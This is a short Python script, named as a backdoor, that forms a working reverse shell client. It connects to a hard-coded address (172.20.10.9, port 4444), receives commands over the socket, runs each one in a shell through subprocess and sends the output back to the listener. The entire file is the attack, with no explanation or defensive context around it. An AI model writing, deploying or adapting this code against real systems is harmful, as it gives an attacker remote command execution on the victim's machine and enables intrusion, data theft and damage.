import socket
import subprocess


Server_IP = '172.20.10.9'
PORT = 4444
pyBackdoor = socket.socket()
pyBackdoor.connect((Server_IP, PORT))

while True:
    command = pyBackdoor.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    pyBackdoor.send(output + output_error)